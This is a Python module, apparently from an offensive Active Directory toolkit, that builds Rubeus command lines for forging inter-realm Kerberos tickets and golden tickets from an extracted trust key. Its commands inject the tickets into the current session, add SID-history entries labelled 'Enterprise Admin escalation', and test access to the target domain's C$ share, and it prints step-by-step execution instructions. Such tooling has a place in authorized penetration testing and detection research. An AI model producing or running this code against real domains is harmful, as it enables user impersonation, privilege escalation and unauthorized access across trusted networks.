"""
Rubeus Ticket Forger
Forge inter-realm TGTs using Rubeus
"""

import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from .base import BaseForger
from ..models import TrustKey, ForgedTicket, KeyType
from ..utils import get_inter_realm_spn


class RubeusForger(BaseForger):
    """
    Forge tickets using Rubeus

    Requirements:
    - Windows system
    - Rubeus.exe available
    - Extracted trust key
    """

    def __init__(self, output_dir: str = "trust_keys", verbose: bool = True):
        """Initialize Rubeus forger"""
        super().__init__(output_dir, verbose)
        self.rubeus_path = "Rubeus.exe"

    def is_available(self) -> bool:
        """Check if Rubeus is available"""
        return shutil.which(self.rubeus_path) is not None or Path(self.rubeus_path).exists()

    def generate_commands(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            user_sid: Optional[str] = None,
            extra_sids: Optional[List[str]] = None
    ) -> List[str]:
        """
        Generate Rubeus commands for inter-realm TGT forging
        """
        target_spn = get_inter_realm_spn(trust_key.target_domain)

        # Determine best key to use
        key_type, key_value = trust_key.best_key

        if key_type == KeyType.AES256:
            key_param = f"/aes256:{key_value}"
        elif key_type == KeyType.AES128:
            key_param = f"/aes128:{key_value}"
        else:
            key_param = f"/rc4:{key_value}"

        commands = [
            "# Rubeus Inter-realm TGT Forging",
            "# This creates a ticket to access the target domain",
            "",
            "# Method 1: Request TGS for inter-realm krbtgt",
            f"Rubeus.exe asktgs /user:{user_to_impersonate} /domain:{trust_key.source_domain} /dc:{trust_key.source_domain} /service:{target_spn} {key_param} /ptt",
            "",
            "# /ptt = Pass The Ticket (inject into current session)",
            "",
            "# Method 2: Save ticket to file instead of injecting",
            f"Rubeus.exe asktgs /user:{user_to_impersonate} /domain:{trust_key.source_domain} /dc:{trust_key.source_domain} /service:{target_spn} {key_param} /outfile:inter_realm.kirbi",
            "",
        ]

        # Add extra SIDs if provided
        if extra_sids:
            sids_param = ",".join(extra_sids)
            commands.extend([
                "# With SID History (Enterprise Admin escalation)",
                f"Rubeus.exe golden /user:{user_to_impersonate} /domain:{trust_key.source_domain} /sid:DOMAIN_SID {key_param} /sids:{sids_param} /service:{target_spn} /ptt",
                "",
            ])

        commands.extend([
            "# Verify ticket is loaded",
            "Rubeus.exe klist",
            "",
            "# Access target domain resources",
            f"dir \\\\{trust_key.target_domain}\\c$",
        ])

        return commands

    def forge_inter_realm_tgt(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            user_sid: Optional[str] = None,
            extra_sids: Optional[List[str]] = None
    ) -> Optional[ForgedTicket]:
        """
        Generate Rubeus forging commands

        Note: Due to Windows-only nature, generates commands for manual execution
        """
        self.log(f"Preparing Rubeus inter-realm TGT forging...")
        self.log(f"Source: {trust_key.source_domain}")
        self.log(f"Target: {trust_key.target_domain}")
        self.log(f"User: {user_to_impersonate}")

        # Generate commands
        commands = self.generate_commands(
            trust_key, user_to_impersonate, user_sid, extra_sids
        )

        # Save commands
        cmd_file = self.save_commands(commands, trust_key, user_to_impersonate)

        # Print instructions
        self._print_instructions(trust_key, user_to_impersonate, cmd_file)

        # Create ticket record
        key_type, key_value = trust_key.best_key

        ticket = ForgedTicket(
            ticket_type="inter-realm TGT",
            username=user_to_impersonate,
            source_domain=trust_key.source_domain,
            target_domain=trust_key.target_domain,
            target_service=get_inter_realm_spn(trust_key.target_domain),
            key_type=key_type,
            key_used=key_value[:8] + "..." if len(key_value) > 8 else key_value,
            extra_sids=extra_sids or [],
            created_at=datetime.now(),
        )

        return ticket

    def _print_instructions(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            cmd_file: Path
    ) -> None:
        """Print manual execution instructions"""
        print(f"\n" + "=" * 60)
        print("RUBEUS INTER-REALM TGT FORGING")
        print("=" * 60)

        print(f"\n[!] Manual execution required (Windows only)")

        print(f"\n[*] Trust details:")
        print(f"    Source: {trust_key.source_domain}")
        print(f"    Target: {trust_key.target_domain}")
        print(f"    Account: {trust_key.account_name}")

        print(f"\n[*] Key to use:")
        key_type, key_value = trust_key.best_key
        print(f"    Type: {key_type.value}")
        print(f"    Value: {key_value}")

        print(f"\n[*] Steps:")
        print(f"    1. Transfer Rubeus.exe to Windows system")
        print(f"    2. Execute commands from: {cmd_file}")
        print(f"    3. Ticket will be injected into session (/ptt)")
        print(f"    4. Access {trust_key.target_domain} resources")

        print(f"\n[*] After injection, verify with:")
        print(f"    dir \\\\{trust_key.target_domain}\\c$")

    def generate_golden_ticket_commands(
            self,
            trust_key: TrustKey,
            user_to_impersonate: str,
            domain_sid: str,
            extra_sids: Optional[List[str]] = None
    ) -> List[str]:
        """
        Generate Rubeus Golden Ticket commands with trust key
        This is an alternative approach using ticket forging
        """
        key_type, key_value = trust_key.best_key

        if key_type == KeyType.AES256:
            key_param = f"/aes256:{key_value}"
        elif key_type == KeyType.AES128:
            key_param = f"/aes128:{key_value}"
        else:
            key_param = f"/rc4:{key_value}"

        commands = [
            "# Rubeus Golden Ticket with Inter-realm Access",
            "",
            f"Rubeus.exe golden /user:{user_to_impersonate} /domain:{trust_key.source_domain} /sid:{domain_sid} {key_param} /target:{trust_key.target_domain} /service:krbtgt /ptt",
        ]

        if extra_sids:
            sids_param = ",".join(extra_sids)
            commands.append(f"\n# With SID History:")
            commands.append(
                f"Rubeus.exe golden /user:{user_to_impersonate} /domain:{trust_key.source_domain} /sid:{domain_sid} {key_param} /sids:{sids_param} /target:{trust_key.target_domain} /service:krbtgt /ptt")

        return commands